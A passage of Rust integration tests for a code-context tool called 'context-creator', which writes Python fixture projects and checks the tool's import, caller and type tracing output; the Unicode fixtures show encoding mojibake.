    pass
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("legacy.py"),
        r#"
class LegacyFeature:
    pass
"#,
    )
    .unwrap();

    fs::write(
        pkg.join("setup.py"),
        r#"
def configure():
    pass
"#,
    )
    .unwrap();

    // User code importing from the package
    fs::write(
        root.join("use_package.py"),
        r#"
# Import from package __init__.py exports
from mypackage import Engine, Config, Processor, helper
from mypackage import DEFAULT_TIMEOUT

# Import the package itself
import mypackage

def main():
    # Use imported items
    engine = Engine()
    config = Config()
    processor = Processor()
    
    result = helper()
    print(f"Timeout: {DEFAULT_TIMEOUT}")
    
    # Initialize package
    mypackage.init_package()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(root)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Should track imports from __init__.py
    let init_section = stdout
        .split("__init__.py")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    if init_section.contains("Imports:") {
        assert!(
            init_section.contains("core")
                || init_section.contains("utils")
                || init_section.contains("constants"),
            "__init__.py should show imports from submodules"
        );
    }

    // Should track that modules are imported by __init__.py
    assert!(
        stdout.contains("core.py") && stdout.contains("Imported by:"),
        "core.py should show it's imported by __init__.py"
    );
}
```

## tests/python_semantic_error_cases_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Error case tests for Python semantic analysis

use std::fs;
use tempfile::TempDir;

/// Test Python files with only comments and docstrings
#[test]
fn test_python_comments_only() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("comments.py"),
        r#"
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
This module contains only comments and docstrings.
No actual code is present.

Author: Test
Date: 2024
"""

# TODO: Implement actual functionality
# FIXME: Add error handling
# NOTE: This is a placeholder file

'''
Another docstring style.
Still no code.
'''

# More comments
# Even more comments

"""And a final docstring"""
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("empty_structure.py"),
        r#"
# File with empty structures

class EmptyClass:
    """An empty class with just a docstring."""
    pass

def empty_function():
    """An empty function."""
    pass

def function_with_ellipsis():
    """Function with ellipsis."""
    ...

if __name__ == "__main__":
    # Nothing happens
    pass
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("comments.py"));
    assert!(stdout.contains("empty_structure.py"));

    // Should not show semantic info for comment-only files
    let comments_section = stdout
        .split("comments.py")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    assert!(!comments_section.contains("Imports:"));
    assert!(!comments_section.contains("Function calls:"));
}

/// Test Python with Unicode in various places
#[test]
fn test_python_unicode_everywhere() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("unicode_identifiers.py"),
        r#"
# -*- coding: utf-8 -*-
"""Test Unicode identifiers and content."""

# Unicode in variable names (Python 3 allows this)
Ï€ = 3.14159
Ï† = 1.618

# Unicode in function names
def è®¡ç®—é¢ç§¯(åŠå¾„):
    """è®¡ç®—åœ†çš„é¢ç§¯ (Calculate circle area in Chinese)"""
    return Ï€ * åŠå¾„ ** 2

def Ð²Ñ‹Ñ‡Ð¸ÑÐ»Ð¸Ñ‚ÑŒ_Ð¾Ð±ÑŠÐµÐ¼(Ñ€Ð°Ð´Ð¸ÑƒÑ):
    """Ð’Ñ‹Ñ‡Ð¸ÑÐ»Ð¸Ñ‚ÑŒ Ð¾Ð±ÑŠÐµÐ¼ ÑÑ„ÐµÑ€Ñ‹ (Calculate sphere volume in Russian)"""
    return (4/3) * Ï€ * Ñ€Ð°Ð´Ð¸ÑƒÑ ** 3

# Unicode in class names
class æ•°æ®å¤„ç†å™¨:
    """æ•°æ®å¤„ç†å™¨ (Data Processor in Chinese)"""
    
    def __init__(self):
        self.æ•°æ® = []
    
    def æ·»åŠ (self, é¡¹ç›®):
        self.æ•°æ®.append(é¡¹ç›®)

# Unicode strings
messages = {
    'greeting': 'ä½ å¥½ä¸–ç•Œ',  # Hello world in Chinese
    'farewell': 'Ð”Ð¾ ÑÐ²Ð¸Ð´Ð°Ð½Ð¸Ñ',  # Goodbye in Russian  
    'welcome': 'ã‚ˆã†ã“ã',  # Welcome in Japanese
    'thanks': 'Ø´ÙƒØ±Ø§Ù‹',  # Thanks in Arabic
    'emoji': 'ðŸ Python is ðŸŽ‰ awesome! ðŸš€'
}

# Using the Unicode identifiers
if __name__ == "__main__":
    é¢ç§¯ = è®¡ç®—é¢ç§¯(5)
    print(f"é¢ç§¯: {é¢ç§¯}")
    
    Ð¿Ñ€Ð¾Ñ†ÐµÑÑÐ¾Ñ€ = æ•°æ®å¤„ç†å™¨()
    Ð¿Ñ€Ð¾Ñ†ÐµÑÑÐ¾Ñ€.æ·»åŠ ("æ•°æ®1")
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("unicode_imports.py"),
        r#"
# Import module with Unicode identifiers
from unicode_identifiers import è®¡ç®—é¢ç§¯, æ•°æ®å¤„ç†å™¨, Ï€

def test_unicode():
    # Use imported Unicode identifiers
    area = è®¡ç®—é¢ç§¯(10)
    processor = æ•°æ®å¤„ç†å™¨()
    
    print(f"Ï€ = {Ï€}")
    return area
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());
    assert!(stdout.contains("unicode_identifiers.py"));
    assert!(stdout.contains("unicode_imports.py"));

    // Check if Unicode function names are tracked
    if stdout.contains("Function calls:") {
        // Look for the unicode_imports.py section and get everything until the next file or end
        let content = if let Some(start_idx) = stdout.find("## unicode_imports.py") {
            let section_start = &stdout[start_idx..];
            // Find the next ## (another file) or use the whole remaining content
            if let Some(next_file_idx) = section_start[21..].find("##") {
                &section_start[..next_file_idx + 21]
            } else {
                section_start
            }
        } else {
            ""
        };

        // Should track Unicode function calls
        assert!(
            content.contains("è®¡ç®—é¢ç§¯") || content.contains("Function calls"),
            "Should handle Unicode function names. Content: {content}"
        );
    }
}

/// Test Python with dynamic imports
#[test]
fn test_python_dynamic_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("dynamic_imports.py"),
        r#"
import importlib
import sys
from importlib import import_module

# Dynamic import using importlib
def load_module_dynamic(name: str):
    try:
        module = importlib.import_module(name)
        return module
    except ImportError:
        return None

# __import__ usage
def load_with_import(name: str):
    try:
        module = __import__(name)
        return module
    except ImportError:
        return None

# Conditional dynamic imports
def load_backend(backend_type: str):
    if backend_type == "sqlite":
        from backends import sqlite_backend
        return sqlite_backend
    elif backend_type == "postgres":
        from backends import postgres_backend
        return postgres_backend
    else:
        raise ValueError(f"Unknown backend: {backend_type}")

# Import from string
module_names = ["os", "sys", "json"]
modules = {}

for name in module_names:
    modules[name] = import_module(name)

# Lazy imports in functions
def use_heavy_library():
    # Import only when needed
    import numpy as np
    import pandas as pd
    
    return np.array([1, 2, 3])

# Plugin system simulation
class PluginLoader:
    def __init__(self):
        self.plugins = {}
    
    def load_plugin(self, plugin_path: str):
        spec = importlib.util.spec_from_file_location("plugin", plugin_path)
        if spec and spec.loader:
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
            return module
        return None
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("exec_imports.py"),
        r#"
# Even more dynamic imports using exec
def super_dynamic_import():
    import_statements = [
        "import json",
        "from collections import defaultdict",
        "import re as regex"
    ]
    
    for stmt in import_statements:
        exec(stmt)
    
    # Now json, defaultdict, and regex are available in locals()

# Using eval for imports (bad practice but possible)
def eval_import():
    module_name = "os"
    os_module = eval(f"__import__('{module_name}')")
    return os_module
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle dynamic imports without crashing
    assert!(output.status.success());
}

/// Test Python with complex comprehensions and generators
#[test]
fn test_python_comprehensions_generators() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("comprehensions.py"),
        r#"
from typing import List, Dict, Set, Generator, Iterator
import itertools
from functools import reduce

# Nested list comprehensions
matrix = [[i * j for j in range(5)] for i in range(5)]

# Dict comprehension with conditions
squared_evens = {x: x**2 for x in range(20) if x % 2 == 0}

# Set comprehension with multiple loops
pairs = {(i, j) for i in range(3) for j in range(3) if i != j}

# Complex comprehension with imports used inside
def process_data(data: List[str]) -> Dict[str, int]:
    import re
    from collections import Counter
    
    # Comprehension using imported module
    words = [
        word.lower() 
        for text in data 
        for word in re.findall(r'\w+', text)
        if len(word) > 3
    ]
    
    return dict(Counter(words))

# Generator expressions
def infinite_sequence() -> Generator[int, None, None]:
    num = 0
    while True:
        yield num
        num += 1

# Generator with complex logic
def fibonacci_generator():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

# Comprehension in function arguments
result = sum(x**2 for x in range(10) if x % 2 == 0)

# Nested generator expressions
nested_gen = (
    (x, y, z)
    for x in range(3)
    for y in range(x, 3)
    for z in range(y, 3)
)

# Using itertools in comprehensions
combinations = [
    combo 
    for combo in itertools.combinations(range(5), 3)
    if sum(combo) > 5
]
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success());
}

/// Test Python with multiple inheritance and MRO
#[test]
fn test_python_multiple_inheritance() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("inheritance.py"),
        r#"
from abc import ABC, abstractmethod
from typing import Any

# Diamond inheritance pattern
class A:
    def method(self):
        return "A"

class B(A):
    def method(self):
        return "B" + super().method()

class C(A):
    def method(self):
        return "C" + super().method()

class D(B, C):
    def method(self):
        return "D" + super().method()

# Mixin pattern
class LoggerMixin:
    def log(self, message: str):
        print(f"[LOG] {message}")

class DatabaseMixin:
    def save(self):
        print("Saving to database")

class CacheableMixin:
    def cache(self):
        print("Caching result")

class Service(LoggerMixin, DatabaseMixin, CacheableMixin):
    def process(self):
        self.log("Processing")
        self.cache()
        self.save()

# Abstract base with multiple inheritance
class Readable(ABC):
    @abstractmethod
    def read(self) -> str:
        pass

class Writable(ABC):
    @abstractmethod  
    def write(self, data: str) -> None:
        pass

class Seekable(ABC):
    @abstractmethod
    def seek(self, position: int) -> None:
        pass

class File(Readable, Writable, Seekable):
    def read(self) -> str:
        return "data"
    
    def write(self, data: str) -> None:
        pass
    
    def seek(self, position: int) -> None:
        pass

# Check MRO
if __name__ == "__main__":
    d = D()
    print(D.__mro__)  # Method Resolution Order
    print(d.method())  # Will print "DCBA"
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success());
}

/// Test Python with context managers and descriptors
#[test]
fn test_python_advanced_features() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("advanced.py"),
        r#"
import contextlib
from contextlib import contextmanager
from typing import Any, Optional
import functools

# Custom context manager class
class FileManager:
    def __init__(self, filename: str, mode: str):
        self.filename = filename
        self.mode = mode
        self.file: Optional[Any] = None
    
    def __enter__(self):
        self.file = open(self.filename, self.mode)
        return self.file
    
    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.file:
            self.file.close()
        return False  # Don't suppress exceptions

# Context manager using decorator
@contextmanager
def timer_context():
    import time
    start = time.time()
    try:
        yield
    finally:
        end = time.time()
        print(f"Elapsed: {end - start:.4f}s")

# Descriptor protocol
class ValidatedAttribute:
    def __init__(self, validator):
        self.validator = validator
        self.name = None
    
    def __set_name__(self, owner, name):
        self.name = f"_{name}"
    
    def __get__(self, obj, objtype=None):
        if obj is None:
            return self
        return getattr(obj, self.name)
    
    def __set__(self, obj, value):
        if self.validator(value):
            setattr(obj, self.name, value)
        else:
            raise ValueError(f"Invalid value: {value}")

# Property decorator with getter/setter
class Temperature:
    def __init__(self):
        self._celsius = 0
    
    @property
    def celsius(self):
        return self._celsius
    
    @celsius.setter
    def celsius(self, value):
        if value < -273.15:
            raise ValueError("Temperature below absolute zero")
        self._celsius = value
    
    @property
    def fahrenheit(self):
        return self._celsius * 9/5 + 32
    
    @fahrenheit.setter
    def fahrenheit(self, value):
        self.celsius = (value - 32) * 5/9

# Using contextlib utilities
@contextlib.contextmanager
def managed_resource():
    resource = acquire_resource()
    try:
        yield resource
    finally:
        release_resource(resource)

def acquire_resource():
    return "resource"

def release_resource(resource):
    pass

# ExitStack for dynamic context management
def process_files(filenames):
    with contextlib.ExitStack() as stack:
        files = [
            stack.enter_context(open(fname))
            for fname in filenames
        ]
        # Process all files
        return files
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success());
}

/// Test Python files with various encoding declarations
#[test]
fn test_python_encodings() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // UTF-8 with BOM (some editors add this)
    let utf8_bom = vec![0xEF, 0xBB, 0xBF];
    let mut content_with_bom = utf8_bom;
    content_with_bom.extend_from_slice(
        br#"
# -*- coding: utf-8 -*-
def hello():
    return "Hello with BOM"
"#,
    );
    fs::write(src_dir.join("utf8_bom.py"), content_with_bom).unwrap();

    // Latin-1 encoding declaration
    fs::write(
        src_dir.join("latin1.py"),
        r#"
# -*- coding: latin-1 -*-
# This file claims to be latin-1 encoded
def function():
    return "CafÃ©"  # Contains latin-1 character
"#,
    )
    .unwrap();

    // Various encoding declaration styles
    fs::write(
        src_dir.join("encoding_styles.py"),
        r#"
# coding: utf-8
# Different style of encoding declaration

# vim: set fileencoding=utf-8 :
# Another common style

def test():
    return "Test"
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    // Should handle various encodings
    assert!(output.status.success());
}

/// Test Python with empty files and edge cases
#[test]
fn test_python_empty_edge_cases() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Completely empty file
    fs::write(src_dir.join("empty.py"), "").unwrap();

    // Just whitespace
    fs::write(src_dir.join("whitespace.py"), "   \n\t\n   \n").unwrap();

    // Just a shebang
    fs::write(src_dir.join("shebang_only.py"), "#!/usr/bin/env python3\n").unwrap();

    // Single line
    fs::write(src_dir.join("oneliner.py"), "x = 42").unwrap();

    // File with only imports
    fs::write(
        src_dir.join("imports_only.py"),
        r#"
import os
import sys
from pathlib import Path
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // All files should be included
    assert!(stdout.contains("empty.py"));
    assert!(stdout.contains("whitespace.py"));
    assert!(stdout.contains("shebang_only.py"));
    assert!(stdout.contains("oneliner.py"));
    assert!(stdout.contains("imports_only.py"));
}
```

## tests/python_semantic_output_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Integration tests for Python semantic analysis output

use std::fs;
use tempfile::TempDir;

/// Test that Python imports are tracked and included in output
#[test]
fn test_python_imports_in_output() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create main.py with various import styles
    fs::write(
        src_dir.join("main.py"),
        r#"
import os
import sys
from pathlib import Path
from typing import List, Dict, Optional

# Local imports
import utils
from helpers import format_string, validate_data
from lib.database import Connection
from lib.api import Client as APIClient

def main():
    utils.setup()
    formatted = format_string("Hello")
    validate_data({"key": "value"})
    
    conn = Connection()
    client = APIClient()
    
    print(f"Path: {Path.cwd()}")
"#,
    )
    .unwrap();

    // Create utils.py
    fs::write(
        src_dir.join("utils.py"),
        r#"
import logging

def setup():
    logging.basicConfig(level=logging.INFO)
    print("Setup complete")

def cleanup():
    print("Cleanup complete")
"#,
    )
    .unwrap();

    // Create helpers.py
    fs::write(
        src_dir.join("helpers.py"),
        r#"
def format_string(s: str) -> str:
    return s.strip().lower()

def validate_data(data: dict) -> bool:
    return bool(data)
"#,
    )
    .unwrap();

    // Create lib directory
    let lib_dir = src_dir.join("lib");
    fs::create_dir_all(&lib_dir).unwrap();

    // Create __init__.py to make it a package
    fs::write(lib_dir.join("__init__.py"), "").unwrap();

    // Create database.py
    fs::write(
        lib_dir.join("database.py"),
        r#"
import sqlite3

class Connection:
    def __init__(self):
        self.conn = None
    
    def connect(self):
        self.conn = sqlite3.connect(":memory:")
"#,
    )
    .unwrap();

    // Create api.py
    fs::write(
        lib_dir.join("api.py"),
        r#"
import requests

class Client:
    def __init__(self):
        self.session = requests.Session()
    
    def get(self, url):
        return self.session.get(url)
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    eprintln!("STDERR: {stderr}");

    // Verify command succeeded
    assert!(output.status.success(), "context-creator failed: {stderr}");

    // Check that semantic analysis was performed
    if stderr.contains("Analyzing semantic dependencies") {
        assert!(
            stderr.contains("Found") && stderr.contains("import relationships"),
            "Should report found imports"
        );
    }

    // Test that main.py shows its imports
    assert!(stdout.contains("main.py"), "Output should contain main.py");

    let main_section = stdout
        .split("## main.py")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    // Should show imports
    assert!(
        main_section.contains("Imports:")
            && (main_section.contains("utils") || main_section.contains("helpers")),
        "main.py should show its local imports"
    );

    // Test that imported modules show they're imported by main
    assert!(
        stdout.contains("utils.py") && stdout.contains("Imported by: main.py"),
        "utils.py should show it's imported by main.py"
    );

    assert!(
        stdout.contains("helpers.py") && stdout.contains("Imported by: main.py"),
        "helpers.py should show it's imported by main.py"
    );
}

/// Test Python class and function tracking
#[test]
fn test_python_class_function_tracking() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    fs::write(
        src_dir.join("models.py"),
        r#"
from dataclasses import dataclass
from typing import List, Optional

@dataclass
class User:
    id: int
    name: str
    email: str
    
    def get_display_name(self) -> str:
        return self.name or self.email

class UserManager:
    def __init__(self):
        self.users: List[User] = []
    
    def add_user(self, user: User) -> None:
        self.users.append(user)
    
    def find_by_id(self, user_id: int) -> Optional[User]:
        for user in self.users:
            if user.id == user_id:
                return user
        return None
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("app.py"),
        r#"
from models import User, UserManager

def main():
    manager = UserManager()
    
    user1 = User(id=1, name="Alice", email="alice@example.com")
    user2 = User(id=2, name="Bob", email="bob@example.com")
    
    manager.add_user(user1)
    manager.add_user(user2)
    
    found = manager.find_by_id(1)
    if found:
        print(found.get_display_name())

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Check imports are tracked
    assert!(stdout.contains("app.py"));
    assert!(stdout.contains("Imports: models"));

    // Check that models.py shows it's imported
    assert!(stdout.contains("models.py"));
    assert!(stdout.contains("Imported by: app.py"));

    // Check if type references are tracked (User, UserManager)
    if stdout.contains("Type references:") {
        let app_section = stdout
            .split("## app.py")
            .nth(1)
            .unwrap_or("")
            .split("##")
            .next()
            .unwrap_or("");

        assert!(
            app_section.contains("User") || app_section.contains("UserManager"),
            "Should track type usage"
        );
    }
}

/// Test Python package imports (from x import y)
#[test]
fn test_python_package_imports() {
    let temp_dir = TempDir::new().unwrap();
    let project_dir = temp_dir.path().join("project");
    fs::create_dir_all(&project_dir).unwrap();

    // Create package structure
    let pkg_dir = project_dir.join("mypackage");
    fs::create_dir_all(&pkg_dir).unwrap();

    let subpkg_dir = pkg_dir.join("subpackage");
    fs::create_dir_all(&subpkg_dir).unwrap();

    // Root __init__.py
    fs::write(
        pkg_dir.join("__init__.py"),
        r#"
"""Main package initialization."""
from .core import Core
from .utils import helper_function

__all__ = ['Core', 'helper_function']
__version__ = '1.0.0'
"#,
    )
    .unwrap();

    // core.py
    fs::write(
        pkg_dir.join("core.py"),
        r#"
from .subpackage.advanced import AdvancedFeature

class Core:
    def __init__(self):
        self.advanced = AdvancedFeature()
    
    def process(self):
        return self.advanced.compute()
"#,
    )
    .unwrap();

    // utils.py
    fs::write(
        pkg_dir.join("utils.py"),
        r#"
import os
from pathlib import Path

def helper_function():
    return Path.cwd()

def internal_helper():
    return os.environ.get('HOME', '/')
"#,
    )
    .unwrap();

    // subpackage/__init__.py
    fs::write(
        subpkg_dir.join("__init__.py"),
        r#"
from .advanced import AdvancedFeature

__all__ = ['AdvancedFeature']
"#,
    )
    .unwrap();

    // subpackage/advanced.py
    fs::write(
        subpkg_dir.join("advanced.py"),
        r#"
class AdvancedFeature:
    def compute(self):
        return 42
"#,
    )
    .unwrap();

    // Main script using the package
    fs::write(
        project_dir.join("main.py"),
        r#"
from mypackage import Core, helper_function
from mypackage.subpackage import AdvancedFeature

def main():
    core = Core()
    result = core.process()
    print(f"Result: {result}")
    
    path = helper_function()
    print(f"Path: {path}")
    
    advanced = AdvancedFeature()
    print(f"Advanced: {advanced.compute()}")

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&project_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);
    let stderr = String::from_utf8_lossy(&output.stderr);

    eprintln!("STDERR: {stderr}");

    assert!(output.status.success());

    // Main should import from mypackage
    assert!(stdout.contains("main.py"));

    // Package files should show relationships
    assert!(stdout.contains("__init__.py"));
    assert!(stdout.contains("core.py"));
}

/// Test Python relative imports
#[test]
fn test_python_relative_imports() {
    let temp_dir = TempDir::new().unwrap();
    let pkg_dir = temp_dir.path().join("package");
    let sub_dir = pkg_dir.join("sub");
    fs::create_dir_all(&sub_dir).unwrap();

    // Package __init__.py
    fs::write(pkg_dir.join("__init__.py"), "").unwrap();

    // sub/__init__.py
    fs::write(sub_dir.join("__init__.py"), "").unwrap();

    // package/base.py
    fs::write(
        pkg_dir.join("base.py"),
        r#"
class BaseClass:
    def method(self):
        return "base"
"#,
    )
    .unwrap();

    // package/derived.py with relative import
    fs::write(
        pkg_dir.join("derived.py"),
        r#"
from .base import BaseClass

class DerivedClass(BaseClass):
    def method(self):
        return super().method() + " derived"
"#,
    )
    .unwrap();

    // package/sub/module.py with parent relative import
    fs::write(
        sub_dir.join("module.py"),
        r#"
from ..base import BaseClass
from ..derived import DerivedClass

def use_classes():
    base = BaseClass()
    derived = DerivedClass()
    return base.method(), derived.method()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&pkg_dir)
        .arg("--trace-imports")
        .output()
        .expect("Failed to execute context-creator");

    let stdout = String::from_utf8_lossy(&output.stdout);

    assert!(output.status.success());

    // Check that files are included
    assert!(stdout.contains("base.py"));
    assert!(stdout.contains("derived.py"));
    assert!(stdout.contains("sub/module.py") || stdout.contains("sub\\module.py"));

    // derived.py should import base
    let derived_section = stdout
        .split("derived.py")
        .nth(1)
        .unwrap_or("")
        .split("##")
        .next()
        .unwrap_or("");

    if derived_section.contains("Imports:") {
        assert!(
            derived_section.contains("base"),
            "derived.py should import base"
        );
    }
}
```

## tests/python_semantic_stress_test.rs

Imports: std::fs, tempfile::TempDir

Type references: fs, tempfile::TempDir.TempDir

```rust
//! Stress tests for Python semantic analysis

use std::fs;
use tempfile::TempDir;

/// Test Python with hundreds of imports
#[test]
fn test_python_massive_imports() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create many modules
    let module_count = 200;
    for i in 0..module_count {
        fs::write(
            src_dir.join(format!("module_{i}.py")),
            format!(
                r#"
def function_{i}():
    return {i}

class Class{i}:
    value = {i}

CONSTANT_{i} = {i}
"#
            ),
        )
        .unwrap();
    }

    // Create main file that imports everything
    let mut content = String::new();

    // Add imports
    for i in 0..module_count {
        content.push_str(&format!(
            "from module_{i} import function_{i}, Class{i}, CONSTANT_{i}\n"
        ));
    }

    // Add main function that uses some imports
    content.push_str("\ndef main():\n    total = 0\n");
    for i in 0..10 {
        content.push_str(&format!("    total += function_{i}()\n"));
        content.push_str(&format!("    obj = Class{i}()\n"));
        content.push_str(&format!("    total += CONSTANT_{i}\n"));
    }
    content.push_str("    return total\n\nif __name__ == '__main__':\n    print(main())\n");

    fs::write(src_dir.join("main.py"), content).unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .arg("--include-types")
        .output()
        .expect("Failed to execute context-creator");

    assert!(output.status.success(), "Should handle 200+ imports");

    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(stdout.contains("main.py"));
    assert!(stdout.contains("Imports:"));
}

/// Test Python with deeply nested function calls
#[test]
fn test_python_deep_call_chain() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create a chain of modules calling each other
    let depth = 50;

    for i in 0..depth {
        let content = if i == depth - 1 {
            // Last function in chain
            format!(
                r#"
def function_{i}(n):
    print(f"Reached depth {i}")
    return n + {i}
"#
            )
        } else {
            // Function that imports and calls the next one
            format!(
                r#"
from level_{} import function_{}

def function_{i}(n):
    return function_{}(n + {i})
"#,
                i + 1,
                i + 1,
                i + 1
            )
        };

        fs::write(src_dir.join(format!("level_{i}.py")), content).unwrap();
    }

    // Create entry point
    fs::write(
        src_dir.join("main.py"),
        r#"
from level_0 import function_0

def main():
    result = function_0(0)
    print(f"Final result: {result}")

if __name__ == "__main__":
    main()
"#,
    )
    .unwrap();

    let output = std::process::Command::new(env!("CARGO_BIN_EXE_context-creator"))
        .arg(&src_dir)
        .arg("--trace-imports")
        .arg("--include-callers")
        .output()
        .expect("Failed to execute context-creator");

    assert!(
        output.status.success(),
        "Should handle 50-level deep call chain"
    );
}

/// Test Python with complex cross-module dependencies
#[test]
fn test_python_complex_dependencies() {
    let temp_dir = TempDir::new().unwrap();
    let src_dir = temp_dir.path().join("src");
    fs::create_dir_all(&src_dir).unwrap();

    // Create interconnected modules
    fs::write(
        src_dir.join("models.py"),
        r#"
from typing import List, Optional
from database import Database
from validators import validate_email, validate_age

class User:
    def __init__(self, name: str, email: str, age: int):
        self.name = name
        self.email = validate_email(email)
        self.age = validate_age(age)
        self.db = Database()
    
    def save(self):
        self.db.save_user(self)

class Group:
    def __init__(self, name: str):
        self.name = name
        self.users: List[User] = []
        self.db = Database()
    
    def add_user(self, user: User):
        self.users.append(user)
        self.db.save_group(self)
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("database.py"),
        r#"
from typing import TYPE_CHECKING
import json

if TYPE_CHECKING:
    from models import User, Group

class Database:
    def __init__(self):
        self.data = {"users": [], "groups": []}
    
    def save_user(self, user: 'User'):
        self.data["users"].append({"name": user.name, "email": user.email})
    
    def save_group(self, group: 'Group'):
        self.data["groups"].append({
            "name": group.name,
            "users": [u.name for u in group.users]
        })
    
    def export(self):
        from exporters import JSONExporter, XMLExporter
        json_exp = JSONExporter()
        xml_exp = XMLExporter()
        return json_exp.export(self.data), xml_exp.export(self.data)
"#,
    )
    .unwrap();

    fs::write(
        src_dir.join("validators.py"),
        r#"
import re
from exceptions import ValidationError

def validate_email(email: str) -> str:
    pattern = r'^[\w\.-]+@[\w\.-]+\.\w+$'
    if not re.match(pattern, email):
        raise ValidationError(f"Invalid email: {email}")
    return email

def validate_age(age: int) -> int:
    if age < 0 or age > 150:
        raise ValidationError(f"Invalid age: {age}")
    return age

def validate_username(username: str) -> str:
    from models import User  # Circular import
